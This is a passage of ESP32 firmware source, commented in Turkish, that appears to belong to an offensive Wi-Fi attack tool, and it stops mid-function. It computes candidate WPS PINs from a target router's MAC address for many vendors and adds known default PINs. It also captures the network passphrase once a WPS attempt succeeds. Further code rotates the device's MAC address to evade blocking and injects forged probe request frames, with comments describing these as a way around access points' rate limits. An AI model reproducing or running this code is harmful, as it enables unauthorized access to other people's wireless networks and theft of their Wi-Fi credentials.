      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 + mac[2] (WZR-HP varyant)
      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
      // Algoritma 5: mac24 XOR mac32 (eski WZR serisi)
      add_calc(pins, count, ((mac24 ^ mac32) & 0x7FFFFFFUL) % 10000000UL);
      // Buffalo fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── MikroTik (hAP, RB, CCR, Audience serisi) ─────────────────────────────
    case VENDOR_MIKROTIK:
      // Algoritma 1: mac24 mod 10^7 (hAP serisi standart)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 sola 1 bit dön (RB serisi)
      add_calc(pins, count, ((mac24 << 1) | (mac24 >> 23)) % 10000000UL);
      // Algoritma 5: mac[3] XOR mac[5] (Audience serisi)
      {
        uint32_t mk = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
                    | ((uint32_t)bssid[4] <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[4]);
        add_calc(pins, count, mk % 10000000UL);
      }
      // MikroTik fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Compal (CH7465, CH7466, NB250 — ISP OEM) ─────────────────────────────
    case VENDOR_COMPAL:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7 (CH7466 varyant)
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]+mac[4]) * mac[5] mod 10^7
      {
        uint32_t cp = (uint32_t)((bssid[3] + bssid[4]) * bssid[5]) % 10000000UL;
        add_calc(pins, count, cp);
      }
      // Compal fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Sercomm (Vodafone/Turkcell branded ISP modemleri) ────────────────────
    case VENDOR_SERCOMM:
      // Algoritma 1: mac24 mod 10^7 (primer)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac24 XOR 0xABCDEF (Sercomm standart)
      add_calc(pins, count, (mac24 ^ 0xABCDEFUL) % 10000000UL);
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac byte döndürme
      {
        uint32_t sr = ((uint32_t)bssid[5] << 16)
                    | ((uint32_t)bssid[3] <<  8)
                    |  (uint32_t)bssid[4];
        add_calc(pins, count, sr % 10000000UL);
      }
      // Sercomm fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Netis / Wavlink (WF, N serisi) ───────────────────────────────────────
    case VENDOR_NETIS:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 * 4 (WF serisi)
      add_calc(pins, count, (mac24 * 4UL) % 10000000UL);
      // Netis fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Cisco ISP (DPC, EPC, ISB kablo gateway) ───────────────────────────────
    case VENDOR_CISCO:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 sağa 1 bit (Cisco Linksys standart)
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: NIC XOR OUI (EPC serisi)
      {
        uint32_t oui = ((uint32_t)bssid[0] << 16)
                     | ((uint32_t)bssid[1] <<  8)
                     |  (uint32_t)bssid[2];
        add_calc(pins, count, (mac24 ^ oui) % 10000000UL);
      }
      // Cisco fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Sagem eski nesil (F@st 1500, 2604, 3504, 3864) ───────────────────────
    case VENDOR_SAGEM:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]+mac[5]) * mac[4] mod 10^7 (F@st 3504 varyant)
      {
        uint32_t sg = (uint32_t)((bssid[3] + bssid[5]) * bssid[4]) % 10000000UL;
        add_calc(pins, count, sg);
      }
      // Sagem fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Comtrend (AR, VR, CT serisi) ─────────────────────────────────────────
    case VENDOR_COMTREND:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 XOR 0x123456 (CT serisi)
      add_calc(pins, count, (mac24 ^ 0x123456UL) % 10000000UL);
      // Comtrend fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Actiontec (GT701, MI424WR, C1000A, T3200) ─────────────────────────────
    case VENDOR_ACTIONTEC:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 döndürme (MI424WR serisi)
      {
        uint32_t at = ((uint32_t)bssid[4] << 16)
                    | ((uint32_t)bssid[5] <<  8)
                    |  (uint32_t)bssid[3];
        add_calc(pins, count, at % 10000000UL);
      }
      // Actiontec fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Gemtek (ISP OEM — Turkcell/TTNet branded) ────────────────────────────
    case VENDOR_GEMTEK:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 * 2 (bazı TTNet branded)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Gemtek fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Iskratel (Si2000, Innbox — Türkiye/Balkan ISP) ───────────────────────
    case VENDOR_ISKRATEL:
      add_calc(pins, count, mac24 % 10000000UL);
      add_calc(pins, count, mac32 % 10000000UL);
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      add_calc(pins, count, (mac24 ^ 0xF0F0F0UL) % 10000000UL);
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Totolink / Zio (Realtek chipset — sabit PIN yaygın, kolay lokma) ─────
    case VENDOR_TOTOLINK:
      // Algoritma 1: mac24 mod 10^7 (Realtek tabanlı standart)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: Zhao XOR fold — tüm 6 byte XOR tek byte → expand
      {
        uint8_t z = bssid[0] ^ bssid[1] ^ bssid[2] ^ bssid[3] ^ bssid[4] ^ bssid[5];
        uint32_t zv = ((uint32_t)z << 16) | ((uint32_t)(bssid[4] ^ z) << 8) | (bssid[5] ^ z);
        add_calc(pins, count, zv % 10000000UL);
      }
      // Algoritma 5: mac24 * 2
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 6: mac24 XOR 0xAAAAAA (Realtek RTL8186 varyant B)
      add_calc(pins, count, (mac24 ^ 0xAAAAAAUL) % 10000000UL);
      // Algoritma 7: mac24 nibble kaydırma (Realtek RTL8196 varyant)
      add_calc(pins, count, (mac24 >> 4) % 10000000UL);
      // Algoritma 8: 7-bit packing — mac[3..5] (Realtek OEM bazı firmware)
      {
        uint32_t pk = ((uint32_t)(bssid[3] & 0x7F) << 14)
                    | ((uint32_t)(bssid[4] & 0x7F) <<  7)
                    |  (uint32_t)(bssid[5] & 0x7F);
        add_calc(pins, count, pk % 10000000UL);
      }
      // Algoritma 9: mac48 XOR fold → tek byte genişleme (RTL8188EU)
      {
        uint8_t xf = bssid[0]^bssid[1]^bssid[2]^bssid[3]^bssid[4]^bssid[5];
        uint32_t xv = ((uint32_t)(bssid[3]^xf) << 16)
                    | ((uint32_t)(bssid[4]^xf) <<  8)
                    |  (uint32_t)(bssid[5]^xf);
        add_calc(pins, count, (xv + (uint32_t)xf) % 10000000UL);
      }
      // Totolink bilinen sabit PINler
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "11111111");
      add_pin(pins, count, "99999998");  // RTL sabit PIN
      break;

    // ── DrayTek Vigor (SOHO/ISP — Vigor 2760, 2765, 2860 serisi) ────────────
    case VENDOR_DRAYTEK:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 sağa 3 bit (Vigor 2765 varyant)
      add_calc(pins, count, (mac24 >> 3) % 10000000UL);
      // Algoritma 5: mac24 XOR 0xDEADBE
      add_calc(pins, count, (mac24 ^ 0xDEADBEUL) % 10000000UL);
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Billion Electric (BiPAC — ISP OEM çeşitli bölgeler) ─────────────────
    case VENDOR_BILLION:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7 (BiPAC 7800 serisi)
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 XOR 0xBBBBBB (BiPAC varyant)
      add_calc(pins, count, (mac24 ^ 0xBBBBBBUL) % 10000000UL);
      // Algoritma 5: mac24 + mac32 (bazı BiPAC 7800DXL fw)
      add_calc(pins, count, ((mac24 + mac32) & 0x7FFFFFFUL) % 10000000UL);
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── NetComm Wireless (NF/NL/NTC serisi — Avustralya ISP OEM) ─────────────
    case VENDOR_NETCOMM:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 * 3
      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Ubiquiti (UniFi/airOS — nadiren WPS aktif, WPS genellikle devre dışı) ─
    case VENDOR_UBIQUITI:
      add_calc(pins, count, mac24 % 10000000UL);
      add_calc(pins, count, mac32 % 10000000UL);
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Bilinmeyen vendor — kapsamlı genel algoritmalar ──────────────────────
    default:
      add_calc(pins, count, mac24 % 10000000UL);
      // Linksys / Cisco sağa kaydırma
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Genel XOR tabanlı
      {
        uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
        add_calc(pins, count, (mac24 ^ x) % 10000000UL);
      }
      // ARRIS / Motorola mac48
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Technicolor / Thomson * 3
      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
      // mac32 tam
      add_calc(pins, count, mac32 % 10000000UL);
      break;
  }
}

// ─── WPS olay işleyici ────────────────────────────────────────────────────────
static void wps_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data) {
  if (base != WIFI_EVENT) return;
  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
    if (e && e->ap_cred_cnt > 0) {
      strncpy(wps_found_ssid, (char *)e->ap_cred[0].ssid,      32);
      strncpy(wps_found_pass, (char *)e->ap_cred[0].passphrase, 64);
    }
    wps_evt_result = 1;
  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
    wps_evt_result = -1;
  }
}

static bool handler_registered = false;

static void ensure_handler() {
  if (!handler_registered) {
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                               &wps_event_handler, nullptr);
    handler_registered = true;
  }
}

// ─── MAC rotasyonu ─────────────────────────────────────────────────────────────
// Engellemeye karşı: her N denemede STA MAC adresini rastgele değiştir.
static void rotate_sta_mac() {
  uint8_t new_mac[6];
  // Orijinal OUI'yi koru (ilk 3 byte) — AP'ye "normal" cihaz gibi görün
  memcpy(new_mac, wps_original_mac, 3);
  // Son 3 byte rastgele
  new_mac[3] = (uint8_t)esp_random();
  new_mac[4] = (uint8_t)esp_random();
  new_mac[5] = (uint8_t)esp_random();
  // Multicast bit temizle, locally-administered bit set et
  new_mac[0] = (new_mac[0] & 0xFE) | 0x02;
  esp_wifi_set_mac(WIFI_IF_STA, new_mac);
  memcpy(wps_current_mac, new_mac, 6);
  DEBUG_PRINTF("MAC rotasyonu: %02X:%02X:%02X:%02X:%02X:%02X\n",
    new_mac[0], new_mac[1], new_mac[2], new_mac[3], new_mac[4], new_mac[5]);
}

// ─── Düşük seviye raw TX bildirimi (deauth.cpp'de tanımlanmış) ───────────────
// ieee80211_raw_frame_sanity_check bypass deauth.cpp'de extern "C" olarak tanımlı;
// burada sadece tx fonksiyonunu bildiriyoruz, tekrar tanımlamıyoruz.
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// ─── WPS PBC Probe Request ham çerçeve enjeksiyonu ───────────────────────────
// AP'ye "WPS butonu bekliyorum (PBC enrollee)" mesajı gönderir.
// Çerçeve içeriği:
//   - 802.11 Probe Request MAC başlığı (24 byte)
//   - SSID, Supported Rates, Extended Supported Rates IE'leri
//   - WPS Vendor IE (OUI 00:50:F2:04):
//       Device Password ID = 0x0004 (PBC) — temel tetikleyici alan
//       Selected Registrar bilgisi, UUID, Primary Device Type vb.
// Bazı eski/zafiyetli AP'ler (Ralink RT5350, MediaTek MT7620 chipset):
//   Bu pakete yanıt olarak kendi PBC modunu otomatik aktif edebilir.
// Modern AP'lerde (ASUS, TP-Link, Sagemcom, ZTE):
//   Fiziksel buton hâlâ gereklidir; ancak bu paket birisi butona
//   bastığında hemen bağlanmak için beacon izleyiciyle birlikte kullanılır.
// ─── PBC Probe Request Enjeksiyon Sistemi — 5 Güncel Metot ──────────────────
//
// Metot 1: Klasik WPS 1.0 — geniş uyumluluk (eski AP'ler)
// Metot 2: WPS 2.0 + HT Caps + DS Param + Ext Caps — modern 802.11n cihaz taklidi
// Metot 3: Wildcard SSID — boş SSID, tüm AP'lere "sen de cevap ver" sinyali
// Metot 4: Broadcast SA — eski Ralink/MediaTek WPS işleyicileri SA kontrolü yapmaz
// Metot 5: Cihaz kimliği rotasyonu — her burst'te farklı cihaz tipi + UUID-E
//
// wps_pbc_probe_burst(): her 500ms'de sırayla tüm 5 metodu çalıştırır.
// Rastgele yerel MAC her burst'te değişir → AP per-MAC rate limit'i aşılır.

// ── Rastgele Locally Administered Unicast MAC üret ───────────────────────────
static void pbc_rand_mac(uint8_t mac[6]) {
  uint32_t r1 = esp_random(), r2 = esp_random();
  mac[0] = (uint8_t)((r1 >>  0) & 0xFE) | 0x02;  // LA=1, multicast=0
  mac[1] = (uint8_t) (r1 >>  8);
  mac[2] = (uint8_t) (r1 >> 16);
  mac[3] = (uint8_t) (r2 >>  0);
  mac[4] = (uint8_t) (r2 >>  8);
  mac[5] = (uint8_t) (r2 >> 16);
}

// ── Ortak WPS Vendor IE oluşturucusu ─────────────────────────────────────────
// buf: çerçeve tamponu, p: mevcut yazma konumu
// sa_mac: UUID-E türetmek için SA MAC (6 byte)
// wps2: true → WPS 2.0 Version2 TLV (attr 0x1021 = 0x20) eklenir
// dev_type_idx: 0-4 arası cihaz tipi seçimi (0=Smartphone,2=PC,4=Camera)
// Döndürür: yeni p konumu
static int pbc_build_wps_ie(uint8_t *buf, int p,
                              const uint8_t *sa_mac,
                              bool wps2, int dev_type_idx = 0) {
  buf[p++] = 0xDD;
  int len_pos = p; buf[p++] = 0x00;  // uzunluk — sonra doldurulacak
  int data_start = p;
  buf[p++] = 0x00; buf[p++] = 0x50; buf[p++] = 0xF2; buf[p++] = 0x04; // OUI+type

  auto tlv = [&](uint16_t attr, const uint8_t *val, uint16_t vlen) {
    buf[p++] = (attr >> 8) & 0xFF; buf[p++] = attr & 0xFF;
    buf[p++] = (vlen >> 8) & 0xFF; buf[p++] = vlen & 0xFF;
    memcpy(buf + p, val, vlen); p += vlen;
  };

  // Version 1.0
  const uint8_t v_ver[] = {0x10};          tlv(0x104A, v_ver,  1);
  // Request Type: Enrollee Info Only (0x01)
  const uint8_t v_rt[]  = {0x01};          tlv(0x103A, v_rt,   1);
  // Config Methods: PBC(0x0080) + Display(0x0008) + Keypad(0x0100) = 0x0188
  const uint8_t v_cm[]  = {0x01, 0x88};    tlv(0x1008, v_cm,   2);

  // UUID-E: SA MAC'in ilk 6 baytından + rastgele 10 bayt — enrollee cihaz kimliği
  uint8_t uuid[16] = {};
  if (sa_mac) memcpy(uuid, sa_mac, 6);
  uint32_t ru = esp_random();
  memcpy(uuid + 6, &ru, 4);
  ru = esp_random();
  memcpy(uuid + 10, &ru, 4);
  ru = esp_random();
  memcpy(uuid + 14, &ru, 2);
  tlv(0x1047, uuid, 16);

  // Primary Device Type: kategori + OUI + alt-kategori
  // 0=Smartphone, 1=Tablet(same), 2=PC/Laptop, 3=Generic, 4=Camera
  static const uint8_t dev_types[5][8] = {
    {0x00,0x0A,0x00,0x50,0xF2,0x04,0x00,0x05},  // Smartphone (cat=10, sub=5)
    {0x00,0x0A,0x00,0x50,0xF2,0x04,0x00,0x01},  // Generic mobile (cat=10, sub=1)
    {0x00,0x01,0x00,0x50,0xF2,0x04,0x00,0x06},  // PC/Laptop (cat=1, sub=6)
    {0x00,0x0A,0x00,0x50,0xF2,0x04,0x00,0x08},  // Tablet (cat=10, sub=8)
    {0x00,0x04,0x00,0x50,0xF2,0x04,0x00,0x05},  // Camera (cat=4, sub=5)
  };
  int di = dev_type_idx % 5;
  tlv(0x1054, dev_types[di], 8);

  // RF Bands: 2.4 GHz + 5 GHz = 0x03
  const uint8_t v_rf[]  = {0x03};          tlv(0x103C, v_rf,   1);
  // Association State: Not Associated (0x0000)
  const uint8_t v_as[]  = {0x00, 0x00};    tlv(0x1002, v_as,   2);
  // Config Error: No Error (0x0000)
  const uint8_t v_ce[]  = {0x00, 0x00};    tlv(0x1009, v_ce,   2);
  // Device Password ID: PBC = 0x0004 ← kritik alan
  const uint8_t v_dp[]  = {0x00, 0x04};    tlv(0x1012, v_dp,   2);
  // OS Version: Unknown (0x80000000)
  const uint8_t v_os[]  = {0x80,0x00,0x00,0x00}; tlv(0x102D, v_os, 4);

  if (wps2) {
    // Version2: 0x20 = WPS 2.0 — modern AP'ler için zorunlu
    const uint8_t v_v2[] = {0x20};         tlv(0x1021, v_v2,   1);
  }

  buf[len_pos] = (uint8_t)(p - data_start);
  return p;
}

// ── Ortak MAC başlığı + SSID IE + Rate IE'leri ───────────────────────────────
// ssid=nullptr → wildcard (boş SSID IE)
static int pbc_build_header(uint8_t *buf,
                              const uint8_t *bssid,
                              const uint8_t *sa,
                              const char *ssid) {
  int p = 0;
  buf[p++] = 0x40; buf[p++] = 0x00;       // FC: Type=Mgmt, Subtype=Probe Request
  buf[p++] = 0x00; buf[p++] = 0x00;       // Duration: 0
  // DA: broadcast
  buf[p++]=0xFF; buf[p++]=0xFF; buf[p++]=0xFF;
  buf[p++]=0xFF; buf[p++]=0xFF; buf[p++]=0xFF;
  memcpy(buf + p, sa,    6); p += 6;      // SA
  memcpy(buf + p, bssid, 6); p += 6;      // BSSID = hedef AP
  buf[p++] = 0x00; buf[p++] = 0x00;       // Sequence Control

  // SSID IE (tag=0)
  uint8_t slen = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
  buf[p++] = 0x00; buf[p++] = slen;
  if (slen) { memcpy(buf + p, ssid, slen); p += slen; }

  // Supported Rates IE (tag=1): 1,2,5.5,11,6,9,12,18 Mbps
  buf[p++] = 0x01; buf[p++] = 0x08;
  buf[p++] = 0x82; buf[p++] = 0x84; buf[p++] = 0x8B; buf[p++] = 0x96;
  buf[p++] = 0x0C; buf[p++] = 0x12; buf[p++] = 0x18; buf[p++] = 0x24;

  // Extended Supported Rates IE (tag=50): 24,36,48,54 Mbps
  buf[p++] = 0x32; buf[p++] = 0x04;
  buf[p++] = 0x30; buf[p++] = 0x48; buf[p++] = 0x60; buf[p++] = 0x6C;

  return p;
}

// ── DS Parameter Set IE (tag=3) — mevcut kanal bildirimi ─────────────────────
static int pbc_add_ds_param(uint8_t *buf, int p, int ch) {
  buf[p++] = 0x03; buf[p++] = 0x01; buf[p++] = (uint8_t)ch;
  return p;
}

// ── HT Capabilities IE (tag=45, 26 byte) — 802.11n desteği ──────────────────
// LDPC + 40MHz + ShortGI20 + ShortGI40 + STBC RX1SS → gerçekçi akıllı telefon profili
static int pbc_add_ht_caps(uint8_t *buf, int p) {
  buf[p++] = 45; buf[p++] = 26;
  // HT Capability Info: 0x01EF
  //   Bit0=LDPC, Bit1=40MHz, Bit5=ShortGI20, Bit6=ShortGI40, Bit7=STBC_TX,
  //   Bit8=STBC_RX=01, Bit9=DelayedBlockAck=0, Bit10=MaxAMSDU=0
  buf[p++] = 0xEF; buf[p++] = 0x01;
  // A-MPDU Params: max len=65535 (log2=3), min spacing=4µs (3)
  buf[p++] = 0x1B;
  // Supported MCS Set (16 byte): MCS 0-7 (1SS), rest 0
  buf[p++] = 0xFF; buf[p++] = 0x00;
  for (int i = 0; i < 8; i++) buf[p++] = 0x00;  // MCS 8-71: desteklenmiyor
  buf[p++] = 0x00; buf[p++] = 0x00;              // RX highest data rate
  buf[p++] = 0x00; buf[p++] = 0x00;              // TX MCS set defined=0
  // HT Extended Capabilities: +HTC support
  buf[p++] = 0x00; buf[p++] = 0x40;
  // TX Beamforming: none
  buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00; buf[p++] = 0x00;
  // ASEL Capabilities: none
  buf[p++] = 0x00;
  return p;
}

// ── Extended Capabilities IE (tag=127, 8 byte) — 802.11ac/ax özellikleri ─────
// Bit2=ExtChanSwitch, Bit19=BSS Trans, Bit25=TDLS, Bit54=OpModeNotif
static int pbc_add_ext_caps(uint8_t *buf, int p) {
  buf[p++] = 0x7F; buf[p++] = 0x08;
  buf[p++] = 0x04; buf[p++] = 0x00; buf[p++] = 0x08; buf[p++] = 0x00;
  buf[p++] = 0x00; buf[p++] = 0x40; buf[p++] = 0x00; buf[p++] = 0x00;
  return p;
}

// ── METOT 1: Klasik WPS 1.0 PBC Probe Request ────────────────────────────────
// En geniş uyumluluk — eski ve yeni tüm AP'leri hedefler.
// WPS 1.0 IE: Version=1.0, PBC DevPwdID, rastgele UUID-E
static void pbc_probe_v1(const uint8_t *bssid, const char *ssid,
                          int ch, const uint8_t *sa) {
  uint8_t buf[320] = {};
  int p = pbc_build_header(buf, bssid, sa, ssid);
  p = pbc_build_wps_ie(buf, p, sa, false, 0);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}

// ── METOT 2: WPS 2.0 + DS Param + HT Caps + Extended Caps ───────────────────
// Modern AP'ler için gerçekçi 802.11n akıllı telefon çerçevesi.
// WPS 2.0 Version2 TLV zorunlu — bazı WPA3/WPA2 AP'ler 1.0 probe'u reddeder.
static void pbc_probe_v2_ht(const uint8_t *bssid, const char *ssid,
                              int ch, const uint8_t *sa) {
  uint8_t buf[320] = {};
  int p = pbc_build_header(buf, bssid, sa, ssid);
  p = pbc_add_ds_param(buf, p, ch);       // DS Parameter Set — kanal bildirimi
  p = pbc_add_ht_caps(buf, p);            // HT Capabilities — 802.11n desteği
  p = pbc_add_ext_caps(buf, p);           // Extended Capabilities — 802.11ac özellikler
  p = pbc_build_wps_ie(buf, p, sa, true, 1);  // WPS 2.0 IE
  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}

// ── METOT 3: Wildcard SSID Probe Request ────────────────────────────────────
// SSID IE boş → tüm AP'lere "PBC enroll etmek istiyorum" sinyali gönderilir.
// Bazı AP'ler yalnızca wildcard probe'a "Selected Registrar=1" içeren
// Probe Response döner — bu da sniffer tarafından algılanır.
static void pbc_probe_wildcard(const uint8_t *bssid, int ch, const uint8_t *sa) {
  uint8_t buf[320] = {};
  int p = pbc_build_header(buf, bssid, sa, nullptr);  // ssid=nullptr → boş SSID
  p = pbc_add_ds_param(buf, p, ch);
  p = pbc_add_ht_caps(buf, p);
  p = pbc_build_wps_ie(buf, p, sa, true, 2);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}

// ── METOT 4: Broadcast SA PBC Probe — Ralink/MediaTek uyumluluk ──────────────
// Eski Ralink RT5350, RT3052, MediaTek MT7620/MT7628 WPS yığınları SA doğrulaması
// yapmaz. Broadcast SA'lı PBC probe'a PBC session açılır.
// Not: 802.11 standartta geçersiz, ancak hedeflenen uyumluluk katmanını tetikler.
static void pbc_probe_broadcast_sa(const uint8_t *bssid, const char *ssid, int ch) {
  static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t buf[320] = {};
  int p = pbc_build_header(buf, bssid, bcast, ssid);
  p = pbc_build_wps_ie(buf, p, bcast, false, 0);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}

// ── METOT 5: Cihaz Kimliği Rotasyonu — Per-MAC Rate Limit Bypass ─────────────
// Her çağrıda farklı cihaz tipi (Smartphone/PC/Tablet/Camera) + UUID-E.
// AP WPS yığınları genellikle aynı UUID-E'yi kara listeye alır;
// rotasyon bu tespiti engeller.
static void pbc_probe_rotating(const uint8_t *bssid, const char *ssid,
                                 int ch, int rot_idx) {
  // Her rotasyonda farklı yerel MAC son octet'i değiştir
  uint8_t sa[6];
  esp_wifi_get_mac(WIFI_IF_STA, sa);
  sa[5] = (uint8_t)(rot_idx * 37 + 0x42);   // deterministik ama çeşitli
  sa[4] = (uint8_t)(rot_idx * 13 + 0x1A);
  sa[0] = (sa[0] & 0xFE) | 0x02;            // locally administered

  uint8_t buf[320] = {};
  int p = pbc_build_header(buf, bssid, sa, ssid);
  p = pbc_add_ds_param(buf, p, ch);
  p = pbc_add_ht_caps(buf, p);
  p = pbc_add_ext_caps(buf, p);
  p = pbc_build_wps_ie(buf, p, sa, true, rot_idx % 5);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
}

// ── Birleşik PBC Probe Burst — tüm 5 metot sırayla ──────────────────────────
// Çağrı başına: 5 farklı probe çerçevesi + 1 rastgele MAC → toplam 5 TX.
// 800µs aralık: AP'nin WPS yığınına işleme süresi verir.
static int  pbc_burst_rot_idx = 0;  // cihaz kimliği rotasyon sayacı

static void wps_pbc_probe_burst(const uint8_t *bssid, const char *ssid, int ch) {
  esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);

  uint8_t rand_sa[6];
  pbc_rand_mac(rand_sa);  // her burst'te yeni rastgele SA MAC

  // 1 — WPS 1.0 klasik (geniş uyumluluk)
  pbc_probe_v1(bssid, ssid, ch, rand_sa);
  delayMicroseconds(800);

  // 2 — WPS 2.0 + HT Caps (modern AP'ler)
  pbc_probe_v2_ht(bssid, ssid, ch, rand_sa);
  delayMicroseconds(800);

  // 3 — Wildcard SSID (Probe Response'dan Selected Registrar tespiti)
  pbc_probe_wildcard(bssid, ch, rand_sa);
  delayMicroseconds(800);

  // 4 — Broadcast SA (Ralink/MediaTek eski firmware uyumluluğu)
  pbc_probe_broadcast_sa(bssid, ssid, ch);
  delayMicroseconds(800);

  // 5 — Cihaz kimliği rotasyonu (per-UUID rate limit bypass)
